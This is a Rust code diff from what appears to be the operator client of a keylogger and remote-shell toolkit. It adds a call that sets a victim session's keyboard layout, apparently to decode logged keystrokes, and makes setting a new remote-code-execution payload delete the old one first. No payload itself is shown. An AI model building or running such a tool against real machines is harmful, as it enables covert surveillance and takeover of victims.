@@ -4,19 +4,20 @@ use std::{
     sync::{Arc, RwLock},
 };
 
+use tamanoir_common::Layout;
 use tokio_stream::StreamExt;
 use tonic::{transport::Channel, Request};
 
 use crate::{
     app::{AppResult, SessionsMap},
     section::{
-        keylogger::utils::init_keymaps,
+        keylogger::init_keymaps,
         shell::{ShellCommandEntry, ShellCommandHistory, ShellHistoryEntryType},
     },
     tamanoir_grpc::{
         rce_client::RceClient, remote_shell_client::RemoteShellClient,
         session_client::SessionClient, DeleteSessionRceRequest, Empty, SessionRcePayload,
-        SessionResponse, SetSessionRceRequest, ShellStd,
+        SessionResponse, SetSessionLayoutRequest, SetSessionRceRequest, ShellStd,
     },
 };
 
@@ -49,6 +50,21 @@ impl SessionServiceClient {
             .into_inner()
             .sessions)
     }
+    pub async fn update_session_layout(
+        &mut self,
+        session_ip: String,
+        layout: Layout,
+    ) -> AppResult<()> {
+        let _ = self
+            .client
+            .set_session_layout(tonic::Request::new(SetSessionLayoutRequest {
+                ip: session_ip,
+                layout: layout as u32,
+            }))
+            .await?
+            .into_inner();
+        Ok(())
+    }
 }
 impl RemoteShellServiceClient {
     pub async fn new(ip: Ipv4Addr, port: u16) -> AppResult<Self> {
@@ -77,6 +93,7 @@ impl RceServiceClient {
         rce: String,
         target_arch: String,
     ) -> AppResult<()> {
+        self.delete_session_rce(session_ip.clone()).await?;
         let msg = SetSessionRceRequest {
             ip: session_ip.clone(),
             rce,
